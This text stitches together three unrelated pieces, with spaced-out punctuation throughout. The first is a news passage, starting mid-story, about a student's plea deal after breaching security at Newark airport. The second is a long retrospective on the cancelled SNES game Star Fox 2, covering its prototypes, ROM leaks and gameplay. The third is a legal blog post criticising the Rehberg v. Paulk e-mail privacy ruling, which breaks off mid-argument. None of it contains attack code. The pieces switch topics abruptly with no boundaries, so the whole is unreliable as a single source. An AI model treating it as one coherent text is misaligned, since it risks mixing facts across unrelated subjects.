Bruce said that Jiang , a Rutgers University Ph.D. candidate who is originally from China , ducked under a rope and entered a security area at Newark Liberty International Airport on January 3 to give his girlfriend a kiss .
The security breach shut down Terminal C for hours and forced the rescreening of thousands of passengers .
Scores of flights were delayed .
Jiang will have to pay a $ 500 fine and court fees and costs of $ 158 , as part of a plea deal reached with prosecutors , Bruce said .
He also will have to perform 100 hours of community service .
He is " very relieved , " Bruce said .
He said the nature of Jiang 's community service has not yet been determined .
" We hope it 'll be at a hospital , soup kitchen , medical clinic , something like that , " he said .
Jiang was arrested on January 8 , several days after the security breach .
Security video from the incident shows a Transportation Security Administration officer who left his post unattended a few minutes after he asked an unidentified man in a light - colored jacket to stay behind the rope line .
Moments later , the man ducks under the rope and walks the wrong way through security to greet a woman .
The lawyer said Jiang and his girlfriend , who lives in California , are still together .
" They are still together , and they are still very much in love , " he said .
Bruce said the charge will appear on Jiang 's record .
" It can be expunged after , I believe , five years .
It 's an arrest , it 's going to show on his record , but it 's a very minor infraction , " he said .
The lawyer said that the incident will not affect Jiang 's immigration status , CNN affiliate News 12 New Jersey reported .
He will likely finish his Ph.D. at Rutgers in May or June , Bruce said .
Jiang is doing research on a cure for glaucoma , cataracts and other eye diseases .
After the security breach , TSA said it would use the incident as a " hard lesson " to reinforce a " sharp focus and tight discipline " at the agency 's stations across the country .
The incident also prompted Sen. Frank R. Lautenberg , D - New Jersey , to introduce legislation that would create a civil penalty of up to $ 10,000 for intentionally breaching airport security and a criminal penalty of up to 10 years in prison .
It would also mandate the use of security cameras at all airport terminal checkpoints and secure area exits at every U.S. airport .
Although the cameras are now recommended for airports , Lautenberg said they are not mandated by law .
Soon after the security breach occurred , Lautenberg had called on the person who had caused the breach to turn himself in , saying " You 've committed what essentially is a crime . "
Star Fox 2 Star Fox 2 ( or StarFox 2 ) , one of the most anticipated games late in the life cycle of the SNES , was quietly cancelled by Nintendo in late 1995 with the impending release of the Nintendo 64 .
In 2002 , a nearly complete prototype of the game was leaked on the Internet by an anonymous former employee , and has become the most well known unreleased game for the Super NES .
On September 29th , Nintendo will finally release the final version on the Super NES Classic Mini .
Thanks to TheRedEye and Retromags for the magazine scans , Psy_Commando for tipping off on the Super Game Power build , and Luigiblood for assembling the source code for an additional binary !

Last updated : September 22 , 2017 Preamble Star Fox 2 is arguably the most infamous unreleased video game .
Prior to the leak of a relatively complete prototype of the game , people always wondered what it could have been like .
Even after the leak of the so called " final beta " version , it was clear that there was still more to be seen .
I asked Dylan Cuthbert on Twitter several years ago , and he said many of the strategic elements were absent from version that leaked out .
In 2017 , we will finally be able to play this gem of a game in its final form .
By all accounts , it has a lot of polish , from what was likely several months of extra development and bug testing .
The 1996 copyright on the title screen is a testament to this ( the " final beta " dates to June 1995 ) .
Nintendo did not cancel the game until it was almost finished , and they decided to allow it to go through the full evaluation process anyways .
Maybe they thought there would come a time that they could put it out , and over 20 years later that is now a reality .
When I originally wrote this article , it was a dark winter in 2010 , and I felt that SNES Central was not complete without a thorough article of this game .
Over seven years later , I am overjoyed that I can give an update for what I regard as one of the top five Super NES games , with a previously unseen alpha build !
Note I am doing this update just before the release of the SNES mini , a followup will come later !
Star Fox 2 - the history
By the middle of 1995 , it was apparent that despite favourable reviews at the Winter 1995 CES , Nintendo was hesitant to release Star Fox 2 against the superior looking Saturn and PlayStation .
The impending launch of the Nintendo 64 also played a part in its cancellation , with Nintendo wanting a clear break between Super FX 3D and N64 3D .
Although Nintendo claimed it would be released in the September 1995 issue of Nintendo Power , it was swept under the rug along with other Super FX games like Comanche and FX Fighter .
Through the course of time , alpha and near final beta ROM images were leaked .
Despite its cancellation , Star Fox 2 remains a highly revered game for its excellent gameplay and intriguing history .

Star Fox 2 at the 1995 Winter CES ( from the March 1995 issue of Total ! )
The Rise and Fall of the Super FX Spectacle The development of Star Fox 2 began almost immediately after the original was finished .
As the above code comment states , Star Fox 2 began development on February 16 , 1993 , a mere five days before the Japanese release of the original ( more on the source code later ) .
The first mention in the press that I found was from the January 1994 issue of Game Players , stating the game would feature split screen multiplayer and use the Super FX2 chip .
The first public statement on the development of Star Fox 2 was in a rec.games.video.nintendo
Usenet post in February 1994 by Dylan Cuthbert stating that it would continue to use polygons ( it also mentions Elite 's unreleased Super FX game , Powerslide ) .
Aside from that , all mentions of Star Fox 2 in 1994 were generally speculation and rumours .
The first display of Star Fox 2 by Nintendo was at the 1995 Winter CES in Las Vegas .
With the delay of the then " Ultra 64 " , Nintendo decided to push several Super FX games ( Star Fox 2 , FX Fighter , Comanche , all of which were eventually cancelled ) along with the unveiling of the Virtual Boy to keep attention focused their way .
Really , the Winter CES show was generally a disappointment , as most companies were biding their time until the first E3 that May .
It seems appropriate that the biggest games and hardware that Nintendo showed at the WCES were disappointments , second rate fare or never released .
However , Star Fox 2 was generally praised by those in attendance , and reports from the CES state that the Star Fox 2 demos were always in use .
The reception in the press ranged from glee ( Total ! , EGM ) , to derision ( Edge ) .
Those who were excited about the game praised the freedom of motion in levels and the new walker mode .
Given the response , everything seemed to be set for the promised summer 1995 release of the game .
The game was so popular , a man named Shawn J. Freeman was arrested for attempting to steal the game ( probably leading to the incorrect assumption that the subsequent leaked ROMs were from the CES show ) !
Star Fox 2 made the cover of UK based Total !
magazine However , it never happened .
Rumours showed up as early as April 1995 that the game had been delayed until 1996 so that it did not clash with the release of the Nintendo 64 and Virtual Boy ( or even that the game had to be retooled - though this certainly was not true ) .
The game was not shown at the inaugural E3 in May 1995 .
Instead , Nintendo showed off the final version of the Ultra 64 hardware , along with the Virtual Boy and Donkey Kong Country 2 .
In the letters section of the September issue of EGM ( presumably published in August ) , the editor wrote that Star Fox 2 was cancelled .
In the September 1995 issue of Nintendo Power , they countered that claim stating : Rumors of the demise of Star Fox 2 have been greatly exaggerated .
Development of Nintendo's sequel to the hit 3 - D space action game is finishing as we go to press .
The big question mark is the release date , most likely in the first half of ' 96 .
The most recent versions of Star Fox 2 look very sharp and include a much more strategic feel , with radar windows and mother ships where you dock after battle .
That was the last official word we heard about Star Fox 2 for the SNES .
In early 1996 , Nintendo showed off what would become Star Fox 64 on the Nintendo 64 , putting the final nail in Star Fox 2's coffin .
Though there are claims that the high cost of producing Super FX games may have led to the delay and cancellation of the game ( something mentioned by Miyamoto - san in a 2017 interview ) , it seems that the main reason was that Nintendo felt it was going to be released too close to the release of the Nintendo 64 ( also mentioned in the same interview ) .
This is a quote from programmer Dylan Cuthbert from the defunct website emulatorium.com :
What happened to Star Fox 2 ?
Why was it cancelled and how far into development was it ?
How is it , if at all , related to Star Fox 64 ?
Star Fox 2 was fully completed .
I was lead programmer and whilst Giles made Stunt Race FX , myself and the rest of the original Star Fox team ( i.e.. Nintendo's artists and designers ) expanded Star Fox into a full 3d shooting game .
We used state - of - the - art technology such as arbitrary plane clipping ( which has only been seen recently in such games as Crash Bandicoot 2 & 3 ) to create some rather spectacular effects .
( for the time )
The reason for non-release was the then impending Nintendo 64 , which of course was intended to be released a lot sooner than it actually was .
Miyamoto - san decided he wanted to have a clean break between 3D games on the SNES and 3D games on the new superior 64 bit system .
In retrospect , he could have released Star Fox 2 and there would have been over a year and a half before the N64 came out .
But hindsight is always 20/20 .
Star Fox 64 incorporated a lot of the newer ideas we created in Star Fox 2 but it did n't , in my view , take the genre a full step forward .
Star Fox 2 really was a different direction of gameplay .
Test screen from the " final " beta showing the probable date the ROM was built on .
From the timing of the statement in Nintendo , it appears that Star Fox 2 was completed in Summer 1995 ( the " final " beta that was leaked has a time stamp of June 22 , 1995 inside the test mode menu ) .
Although the impending release of the Nintendo 64 factored into the decision to cancel the game , I 'm sure the impressive release of the PlayStation also factored into it .
Despite sporting excellent gameplay that outshone most Saturn and PlayStation games released in 1995 , the graphics were definitely not impressive in comparison .
Mock - up box used by Nintendo for the Winter CES showing of Star Fox and media advertising ( originally scanned by Locke Cole from an old EB Games advertisement , and heavily edited by myself ) .
Post Cancellation Though Star Fox 2 did not come out , it did influence subsequent Nintendo games .
Miyamoto stated many of the ideas and technology for the 3D environment from Super Mario 64 came during the development of Star Fox ( and probably Star Fox 2 as well ) .
Miyamoto claimed about 30 % of the ideas in Star Fox 64 came from Star Fox 2 ( in all likelihood referring to the all - range mode battles , Star Wolf team and the tank levels ) .
Dylan Cuthbert stated the strategic elements from Star Fox Command for the DS were inspired by Star Fox 2 . ROM leaks
Were it not for the Internet , that might have been the last we heard about Star Fox 2 .
Though there were still occasional comments about Star Fox 2 on Usenet in 1996 and 1997 , it was increasingly clear that Star Fox 2 was not officially coming out .
The blossoming SNES emulation scene in the late 90s became an outlet for the proliferation of many unreleased and beta games that would have never seen the light of day .
Though website archives at Archive.org are incomplete , I noted that Cherryroms.com ( a large SNES ROM site back then ) took Star Fox 2 off their " undumped " list between May 1999 and September 1999 .
This could only mean that the early " multiplayer " alpha leaked sometime between those dates .
This alpha certainly piqued the interest of SNES fan - sites such as SNESZone and The SNES Site ( an early incarnation of SNES Central , certainly my writing and analysis has improved since then ) who produced articles about it .
It was clear that this was only an internal development alpha , as even the version of Star Fox 2 shown at the Winter CES was far further along in development than this alpha .
Example of a bootleg Star Fox 2 cart that I found on the INTERNET
The real blockbuster , which served as the pinnacle of the SNES emulation scene , in my opinion , was the release of the final beta of Star Fox 2 in August 2002 ( well documented by d4s in this FAQ , who also had a big hand in the discovery of the ROM image ) .
The first screenshots appeared on the now defunct website , sportkompaktwoche.de .
The ROM itself needed several fixes ( made by The Dumper ) before it could play in emulators , though there were accusations that it was a fake before that happened .
The unfixed ROM was leaked by " skyhawk " of the German fan translation site , Alemanic Translations .
Apparently skyhawk claimed to have found this game on a prototype cart and dumped it himself , probably leading to the widespread belief this game was found off a prototype cart .
In reality , Star Fox 2 was leaked as a pure assembled binary from a former developer who wanted the game emulated , and the ROM was not in a proper SNES ROM format initially .
There was no source code leaked , nor was there ever a prototype or production cart of it .
Soon after the leak of Star Fox 2 , emulator authors incorporated proper Super FX emulation , allowing the general community to play the game in all its glory .
The final part of the Star Fox 2 story is the fan translation .
Though it was clear English text versions of this game existed ( look at screenshots taken from the game at the Winter 1995 CES ) , the leaked final beta was entirely in Japanese .
In 2004 , the hacking / translation team of Gideon Zhi , d4s , Fusoya and satsu from Aeon Genesis translated the game to English , and removed all the debugger information and cheats that were the last remnants of the beta status of the game .
Essentially they finished up the game to what the final version might have looked like .
The completed translation has become the fodder for many bootleggers making " reproduction " carts that have fooled more than one person into thinking the game actually did come out .
Source Code I managed to get my hands on some source code for Star Fox 2 .
I was asked not to distribute the code , and I will respect that .
The source code originated from a programmer at a British game company that produced computer games in the early 90s , but worked briefly at Argonaut .
There are three archives of the source code , dating from April - May 1994 .
Star Fox 2 was programmed on an OS / 2 operating system .
There are not many real goodies of interest to the general reader ( it is mostly straight ahead assembly , with few comments ) .
Argonaut used their own custom assembler called ARGASM ( yeah ) .
The graphics files are in a customized binary format that I did not feel like attempting to crack .
The earliest source archive in this set dates to April 15 , 1994 .
This archive also ( to my surprise ) contained a ROM in it .
After scanning it , it turned out to the early alpha ROM , solving the mystery as to where it came from !
There is a lot of legacy code in this archive as well , including some code from a Super NES version of StarGlider ( which became Star Fox ) .
The second set of source code dates to May 6 , 1994 .
It has most of the same files as the April 15 archive , but does have added level files , including training levels and one entitled " room " .
Unfortunately , there were n't any precompiled binaries in this archive .
The third archive dates to May 13 , 1994 .
The levels code was pretty much unchanged from the previous archive .
There are binary files in this archive , but were not linked together .
Thanks to skilled hacker , Luigiblood , and the fact that one of the archives contained the the Super FX assembler , it is now possible to play the version from the previously uncompiled archives .
Luigiblood was able to write a linker from scratch , and confirmed that it was working properly by matching pre-compiled binary in the April 15 archive .
AS previously inferred , the May 6 and May 13 archives produce a near identical binary , but both are significantly different from the April 15th one .
Prototypes
At this point , there are four known leaked prototypes of Star Fox 2 : three from the source code archives mentioned above , and the " final beta " .
There were plenty of mentions about a third , even earlier alpha , even referenced on the old version of this page .
However after analysis , the really early alpha turned out to be a demo of the Game Boy game , X . In addition , there are three prototype version of the game shown to the media , one was from a preview in Nintendo Power , one from a Brazilian game magazine , and a version shown at the 1995 Winter CES .
April 15 , 1994 build
The " early alpha " originated from the source code mentioned earlier ( as a file called SF.ROM ) .
There is no record of when it originally leaked on the Internet , but looking at FAQs from Cherryroms.com , it must have been leaked sometime between May and September 1999 .
The ROM itself is rather buggy , and flickers on real hardware ( if this video is actually being played on real hardware ) .
If you want to play this game with minimal problems , I suggest using a recent version of Higan , which allows you to run it with proper cartridge mapping ( use the included manifest. bml file ) .
It might take a few resets to get it to run , which may be because the game does n't properly initialize the RAM .
Despite the alpha feel to this build ( once you win a level , the game basically freezes and you have to reset ) , the 3D navigational aspects of this game are certainly approaching completion .
The Arwing also is able to transform into a walker in land - based levels ( which is in the final version ) , and this " hover " style craft in space - based levels .
The hover mode never made it into the final version , probably because it is a bit difficult to control .
Many of the land - based levels have N - E - S - W markers so you can tell what direction you are going .
All the enemies and objects in the level ( except bosses that show up ) are bounded to a square area on the radar screen , though you can keep going outside of this boundary .
If you go far enough , you loop around to the other side .
The control scheme is the same as in the first Star Fox game ( they switched the fire button from " Y " to " B " in the final version ) .
Also notable is that acceleration / braking causes your ship to overheat for a short while if you hit the limit of the bar .
The programming for the walker does not seem complete , as it moves very slowly .
The music is very nice , but I did not immediately recognize any of the songs being in either Star Fox or the final beta of Star Fox 2 .
In the " Mission " mode , you have the choice between Fox , Slippy , Peppy , Falco , Saru and Lady ( the latter two were changed to Miyu and Fay in the final beta ) .
Each Arwing has a distinct design , though they control and act the same .
There are nine levels to select from , with varying amounts of enemies and objects , but generally pretty simplistic if compared with the final beta .
Here is a summary : STG1 - Ground : Several ostrich - like enemies roam around , once defeated an early form of the Space Blade comes , defeated by hitting glowing weak spots .
The ship ejects two smaller ships that fly at you
STG2 - Desert : A second Arwing flies around in this level .
There is a platform where the " E " is marked on the radar .
There is this pillar in the middle , and you can shoot the top and bottom off , which summons the Mirage Dragon
STG3 - Magma :
The background is the same as in the Ground Level .
Again , another Arwing starts off with you at the beginning of the level ( if you shoot it down , the level ends ) .
There is a single enemy on a raised platform , if defeated it brings the Space Blade .
STG4 - Park :
The background is the same as in the Ground level .
Lots of four legged insectoid enemies , and robots that do n't move .
After a while , the Space Blade boss comes .
STG5 - Sun : Different music than the first four levels , with multiple rocket ships .
Destroy one and the Mirage Dragon comes .
Very impressive background .
STG6 - Sea : Different music yet again .
There are a bunch of rings you can fly through , several birdlike enemies and rocket ships .
Destroy an enemy and the Mirage Dragon comes .
EXT1 - Senkan : Space level with lots of enemies .
The game and sometimes zsnes crashes hard when you hit an enemy .
EXT2 - Asteroid : Lots of regularly spaced cubes ( asteroids ? ) floating around .
Again , the game crashes if you hit something .
Another Arwing starts the level with you .
EXT3 - Hidora : Another space level , but is very similar to the Park level in terms of enemies .
There are these strange flaming head enemies .
Defeat the enemies and the Mirage Dragon comes .
Space Blade entering the scene Arwing " hover " mode that is not in the final beta Multiplayer selection screen with Andross and an unnamed fox character ( Lady ) Multiplayer gameplay
In the two player battle mode , you have the choice between six characters : Fox , Slippy , Peppy , Falco , Andross and a female (? ) fox character .
There are five levels : two ground , two space and marine .
The radar has a white marker where your opponent is .
Once one person is defeated , the winning ship flies off , and you must reset .
The multiplayer mode actually works quite well , with no slowdown , although it is easy to see that it could be pretty boring after a few attempts .
The test mode has five levels , plus an option to choose from various different programmers ( maybe to write who did the test in the debugger ? )
The marine stage allows your walker to go into a " swimming " mode , though you can only go upwards .
The levels are empty except for rings .
There are Ground , Desert , Marine and Space levels , and you can choose one or two player modes .
There are two modes in training : type and train .
The " type " mode is a single screen thing that might be an explanation screen for various parts of the game .
The Arwing flies in a dark screen where random ostrich enemies appear and can be shot .
The " train " mode shows the ground level , with an explanation of the controls on screen , plus the alphabet and numbers on the right side , which I can only assume are filler for future content .
Finally , the config mode has options for stereo and mono sound , plus a sound test ( which does n't appear to work ) .
Not much else to say about that .
In summary , the alpha appears to have most of the game engine for Star Fox 2 finished , but the levels and enemies are in a very early state .
There was no programming to return the player to the menu after defeating the bosses and debugger information is displayed while playing .
The two player battle mode works quite well and has a fox character that is not in the final beta .
May 6 , 1994 build Luigiblood was able to assemble the source code of a build dating to May 6 , 1994 .
Alas , it this build is far less interesting than the April 15th build , with empty levels , no sound ( except when you play through one round of multiplayer ) , and the co-op mode seemingly removed .
The map screen now shows some planets .
There are a lot of bug fixes in this build , which results in a lot less crashing problems in the main levels .
The multiplayer mode is fully functional as well .
If you go out of bounds , it gives a warning sound and the screen goes dark .
There is no consequence to that , though .
The level selection is the same as in the previous build , but the backgrounds and level layouts are a lot different , and fewer ( or no ) enemies .
Title Screen Multiplayer Planets added to the map screen The Sun level .
Most levels are pretty sparse in this build .
May 13 , 1994 build
The May 13 , 1994 build is visually identical to the May 6 build , except for one thing .
On the STG1 - Ground level , it appears that the draw distance it a little bit worse ( but maybe my eyes are deceiving me and it is just a timing difference ) .
I guess they were experimenting .
May 6 , 1994 build May 13 , 1994 build Title screen from the November 25 , 1994 build ( from the February 1994 issue of Nintendo Power ) November 25 , 1994 beta Nintendo Power had an " exclusive " preview of Star Fox 2 in their February 1994 issue .
It is far more advanced in development than the alpha ROM .
In this version , there is a very plain , almost squared off map .
The third transformation of the Arwing still exists in this beta .
The game appears to have a lot of polish at this point .
The start menu screen is different than the CES beta with the game titled " Star Fox II " and displays Andross and a goat / sheep character that is not in the final version .
Map screen varies significantly from the final version Third transformation of the Arwing that was later removed .
Cover of Super Game Power Super Game Power build Star Fox 2 made it on to the cover of the March 1995 issue of the Brazilian game magazine Super Game Power ( essentially the Brazilian version of Gamepro ) .
Despite the fact the game was not complete , they gave it a full review ( scoring it a 4.8 our of 5 ) .
I believe this build is intermediate of the November 25 , 1994 beta and the version shown at Winter CES .
The map screen appears to be different from both versions ( notably Corneria is in the center , not the bottom left ) , and the character portraits for Miyu and the goat / sheep character are different .
The language in this build is set to Japanese .
Map Screen Gameplay Winter CES beta ( from the March 1995 issue of EGM ) 1995 Winter CES beta
This beta was shown at the 1995 Winter CES in January 1995 , and was the centrepiece of Nintendo 's display since the " Ultra 64 " was only shown behind closed doors .
Most descriptions of the WCES event say that the Star Fox 2 units were always busy .
The beta was impressive enough to make the cover of Total !
magazine in the UK ( with a nice description of the display at the WCES ) , and a multi-page preview in Electronic Gaming Monthly ( which has more pictures than any other magazine ) .
Several shots found in magazines are the same , so I assume that these come from a media package distributed by Nintendo at the WCES .
From the looks of the pictures , the gameplay engine was complete by this point .
The interface of the game is not much different from the final beta .
One thing of note is that the CES beta has English text .
The characters in the WCES beta appear to be finalized , though the title screen uses different artwork from the final beta .
Notably , the goat / sheep character has been replaced by Fay .
The title screen also indicates a change from Roman to Arabic numerals for the title .
The WCES beta had a different map screen than the 94 -11 - 25 beta , and lacks the Macbeth and Fortuna levels that are in the final version .
The map icons for enemy types also differ from the the final beta .
It also looks like the space battle scenes are in a third person view , rather than a first person view like in the final beta .
The introductory screen for levels shows that the targets to open up the base differed in the WCES beta and the level layouts were not the same .
I did not see any screenshots of the " hover " transformation of the Arwing , indicating it might have been cut by the WCES .
Overall , the game seemed to be coming together by the Winter CES showing , and mostly just needed additional levels to complete development .
The map screen shows fewer levels and different graphics from the final version
The targets for planet levels differed in the WCES beta compared to the final one .
Andross in the WCES beta .
The beta was completely in English Battles in space levels were done in a third person view , rather than a first person view like in the final versions June 22 , 1995 - " Final Beta "
The so called " final beta " of Star Fox 2 is the culmination of a nearly two and a half year development process to take the game from an on - the - rails shooter to a fully 3D experience .
The game is close to its final state , in that it is playable to the end with few game breaking bugs .
The framerate counter , several debugger modes , and some hard coded cheats indicate that this was not the final production version .
According to Dylan Cuthbert , some gameplay features , like randomness in enemy formations and other strategic gameplay that are in the final version have not been implemented in this version .
When this final beta was leaked , many were not convinced that it was as near final as claimed .
Due to the incomplete nature of Super FX emulation in mid 2002 , the game had a flickering screen and tended to freeze .
Here is what I said in an article that I wrote on September 22 , 2002 , after the beta leaked : Despite what others say , I disagree with people saying that it was a " final " beta .
This game had a few levels in the story mode that took place in space , but due to a particularly annoying bug , proceeding very far in the game is very difficult .
The bug makes it so that Star Wolf characters attack you at every small movement on the map , but you can't actually attack them unless you are very close to their ship on the map ( and often you are n't ) .
Also , when you are fighting in levels , quite often your ship disappears and the camera freezes in place , making you have to reset the game .
Also , there is test levels for using a Star Wars - like walker , but in general , these stages are quite buggy and the game randomly crashes .
I seriously doubt these bugs are from the lack of Super FX emulation .
To me , it seems like the game engine for the free - range mode stages was complete , but the walker stages were not .
If you ask me , this beta stands as a 75 % complete game at best .
I will try it again once the next version of Zsnes comes out and see if any of these bugs were fixed .
Final beta in test mode .
Note the framerate and sprite counters .
Of course , I was completely wrong in my assessment , and I eventually had to eat crow .
Once the emulation bugs were fixed , Star Fox 2 became completely playable with few bugs .
It is true that the levels in the debugger modes are glitchy and prone to crashing , however these have no bearing on the mission modes .
Speaking of the test modes , there are a few things in the menu of this build that should be noted .
The " Test " menu brings you to a selection of levels , some of which are obviously not in the final mission mode .
The planetary and battleship missions tend to have no real ending when you defeat the core of the base ( you can crash into the core to kill yourself ) .
There were a couple of Andross battle modes .
I found after beating one of the Andross levels that the sound started to glitch ( it just kept repeating samples of the characters talking at the end ) .
Also , your health does n't replenish between levels , so if you die in one , you are left with no health in the next test level .
Before starting each test level , there is a " planet step " , which can be set to different numbers to take you to different parts of the stage .
Your Arwing is orange coloured in the test modes , and the character you use seems to be be random .
The Practise mode seems to just be the " easy " mode , except Corneria does n't take damage , you have two Fox Arwings , and they are coloured orange .
There seems to be little else different , as the scores in the training mode and the General Pepper coins are saved in the records .
The config mode allows you to change the sound from stereo to mono , and also has a sound test .
In the main game , there is a cheat that makes it so Corneria does not take damage , making the game rather lacking in challenge .
The fan translation spruces up the logo .
Fan translation
Thanks to the efforts of Aeon Genesis , the June 22 , 1995 build of Star Fox 2 was fully translated to English and the last of the bugs / cheats ( i.e. the bug where the Arwing can transform in space levels and Corneria not getting damage when attacked ) were fixed .
The translation patch came out on October 17 , 2004 , over two years after the beta was leaked onto the Internet .
Even at that point emulators had trouble running the game , though it appears that zsnes 1.40 came out a couple of months later with support .
I 'll admit that I never got around to playing the patch until I started the article , which probably is why I never updated this page for years and incorrect information was allowed to perpetuate ( many of the pieces of incorrect information on the Wikipedia page for Star Fox 2 appear to have come from the old article ) .
I think the translation is excellent , though admittedly Star Fox 2 is not the most story driven game .
The patch gives the game a nice bit of polish to make it look like it would have if it was released .
Game Overview Star Fox 2 is an excellent game , and I consider it to be in my top 10 favourite SNES games .
This game corrects pretty much all of the complaints from the first game ( lack of range of motion , poor frame rate , lack of aiming cursor ) , and upped the intensity level .
Though some might be disappointed they cut the two player multiplayer mode ( which existed in the Winter CES beta ) , the excellent single player mode more than makes up for it .
The map screen from Star Fox 2 Star Fox 2 is more than just a straight ahead shooter like its predecessor .
The game runs in a semi-real time mode , with the forces of Andross closing in to destroy the planet of Corneria .
Your force ( two Arwings that can be changed at any point on the map screen ) flies around the map , while you encounter ships , rockets and planets that are occupied by Andross .
The game is split up into three difficulty levels .
Rather than just increasing the amount or hit points of enemies when increasing the difficulty levels , the amount of planets needed to be rescued also increases , and the level layouts become more complex .
On " normal " difficulty , only two planets need to be saved , two battleships need destroyed , and the levels are very straight forward .
In " Expert " difficulty , six planets need saved , four battleships need destroyed , and the levels are complex and have bosses in them .
I found the " normal " and " hard " modes were fairly easy to beat , and I passed them first try .
On " expert " , it really becomes crucial to manage the assault on Corneria and beat levels quickly or the planet quickly takes too much damage .
Since the Mothership can heal your ships , the main challenge is protecting the planet .
The battles in Star Fox 2 are split between first person sections in space and third person planetary and battleship levels .
The space sections have you doing dog fights against other ships ( including the rival Star Wolf gang ) .
The planet and battleship levels allow you to switch between the Arwing and walker modes on the fly .
On planets , you have to step on trigger switches to raise the base from the ground .
Once inside the base or battleship , you usually have to solve a maze or defeat a boss to gain access to the energy core .
Thankfully , they added a cross -hair to make aiming more precise and the ability to lock on and shoot a charged energy blast at enemies .
Character selection is key to success in this game .
Each character has strengths and weaknesses , making it key to pick a character that suits your playing style .
For instance , Slippy and Peppy 's Arwings are tanks that can take more hits than any other character , but have a much longer charge time for the energy blast and are slow moving .
Miyu and Fay are the opposite ; they have the weakest Arwing but can shoot off several charged blasts in the time it would take for Slippy and Peppy to shoot one .
They also start with the twin lasers making them and offensive powerhouses from the get go .
Falco and Fox have statistics between these extremes .
Walker mode with a General Pepper medallion .
Now for the nitpicking section .
The game has great graphics for a Super FX game .
The obstacles in planet levels have textures on them , and the backgrounds are detailed .
A nice added touch in the space levels are that the backgrounds reflect the location on the map where you fight the enemy .
The framerate is better than in Star Fox , though it does tend to slow down if there is a lot of action on screen .
The music is top notch , as you might expect from a Nintendo developed game .
The control scheme rotated the face buttons by a quarter turn counterclockwise from the first game .
The only complaints I have about the controls are that the cross -hair does n't automatically reset to the centre of the screen in first person levels , leading to a bit of frustration in Star Wolf battles .
Additionally , turning the walker is a bit slow , though this is likely dictated by the frame rate .
Overall , the final beta of Star Fox 2 is a lot of fun .
I found the dogfight battles to be very intense and exciting .
The expert mode takes about an hour to pass .
The main replay value comes in trying to get higher scores .
Additionally , there are General Pepper medallions in all the levels that you can search out .
Once collected , they do not appear in future playthroughs .
Space battles are done in a first person view .
Here , battling Pigma over Titania
In each planetary base and battleship , there is a core that needs to get destroyed .

Nintendo has gone at great lengths to promote this , even including concept art and a mockup of the SNES manual on their online instruction manual .
The 1996 copyright on the screen indicates that there might have been quite a bit of a gap between the June 22 1995 build and what is the true final version .
Nintendo even brought back the original designer ( Takaya Imamura ) to do the promo artwork for the game .
Promo artwork specifically for the SNES mini release Original concept art As I release this updated article , it is still one week before the SNES mini comes out .
I anxiously await getting my copy so that I can finally play the final version of one of my favourite games .
Once I give it a good playthrough , I will be updating this once again !
First time I passed the Expert mode ( barely ! )
Summary Star Fox 2 is one of the best Super NES games , and it is a shame that it never officially got released .
Although several aspects of Star Fox 2 made it into Star Fox 64 , this game has a much different feel and seems more intense .
At the very least , the two and a half years developing this game did not go to complete waste and we can now enjoy the fruits of this first party title with the aid of emulators .
I even found myself playing the game for an hour when all I wanted was a single screenshot of a level , which should give you an idea of how great the gameplay is .
Star Fox 2 played a large role in the development of fully 3D Nintendo titles on the Nintendo 64 and serves as an interesting footnote in the history of the Super NES .
Star Fox 2 is still considered one of the most enduring vaporware titles and one of the most interesting stories of the Super NES .
I look very much forward to playing the final version .

Last Thursday , the Eleventh Circuit handed down a Fourth Amendment case , Rehberg v. Paulk , that takes a very narrow view of how the Fourth Amendment applies to e-mail .
The Eleventh Circuit held that constitutional protection in stored copies of e-mail held by third parties disappears as soon as any copy of the communication is delivered .
Under this new decision , if the government wants get your e-mails , the Fourth Amendment lets the government go to your ISP , wait the seconds it normally takes for the e-mail to be delivered , and then run off copies of your messages .
In this post , I want to explain why the Eleventh Circuit ’s position is wrong .
I ’ll start by explaining the argument ’s origins in postal mail cases ; I ’ll turn next to Rehberg ; I ’ll then explain why I think the decision is based on a conceptual error ; and I ’ll conclude with some final thoughts .
I. The Source of the Argument : Fourth Amendment Protection in Postal Mail
To see where the 11th Circuit is getting this argument , you need to know a little bit about how the Fourth Amendment protects postal mail and packages .
The Fourth Amendment ordinarily protects postal mail and packages during delivery .
The same rule applies to both government postal mail and private delivery companies like UPS :
As soon as the sender drops off the mail in the mailbox , both the sender and recipient enjoy Fourth Amendment protection in the contents of the mail during delivery .
When the mail is delivered to the recipient , the sender loses his Fourth Amendment protection : The Fourth Amendment rights are transfered solely to the recipient .
In practice , this works pretty simply : Each party has Fourth Amendment protection in the mail when they ’re in possession of it , and both the sender and receiver have Fourth Amendment rights in the contents of the mail when the postal service or private mail carrier is holding the mail on their mutual behalf .
I should be clear that there are exceptions to these rules .
For example , if a person sends a letter in what the Postal Service used to call “ Fourth Class ” mail — that is , mail that the Postal Service reserves the right to open — then it is not protected by the Fourth Amendment .
See , e.g. , Also , the Fourth Amendment protection only applies to the contents of the communication , not the outside .
But the basic approach has governed postal mail privacy for a long time .
The new question is , how do to these principles apply to new communications technologies like e-mail and text messages ?
Unlike physical letters and packages , e-mails and text messages are just data .
Communications technologies use digital networks that generate copies of the communications in the course of delivery .
Those copies often stick around on servers when a copy of the communication reaches its destination .
The Stored Communications
Act provides statutory privacy protection to those communications stored on third - party servers , see 18 U.S.C. 2703 .
But does the Fourth Amendment protect those copies of communications as well ?
Right now the precedents are extremely sparse .
II .
Rehberg v. Paulk
Enter Rehberg v. Paulk , decided by the Eleventh Circuit last week in an opinion by Judge Hull joined by Judges Carnes and Anderson .
The case is kind of complicated , but here ’s the relevant part .
State investigators suspected Rehberg of a crime , and they allegedly used a state subpoena to obtain the contents of Rehberg ’s e-mail from his Internet service provider , Exact Advertising .
The complaint suggests that the government obtained both incoming and outgoing e-mails stored with Rehberg ’s ISP ; according to the complaint , investigators “ obtained Mr. Rehberg ’s personal e-mails that were sent and received from his personal computer . ”
The charges against Rehberg were later dismissed , and Rehberg filed a lawsuit that claimed among other things that obtaining his e-mail with only a subpoena violated his Fourth Amendment rights .
The defendants moved to dismiss under Rule 12 ( b ) ( 6 ) .
The district court denied the motion to dismiss without really analyzing the Fourth Amendment claim , but the Eleventh Circuit ruled that obtaining Rehberg ’s e-mails with a subpoena did not violate the Fourth Amendment because e-mail , once delivered , is not protected by the Fourth Amendment :
The subpoenas covered information Rehberg had provided voluntarily to third parties and for which Rehberg did not have a legitimate expectation of privacy .
Thus , the subpoenas did not violate Rehberg ’s Fourth Amendment rights to be free of unreasonable search and seizure .
In order for Fourth Amendment protections to apply , the person invoking the protection must have an objectively reasonable expectation of privacy in the place searched or item seized .
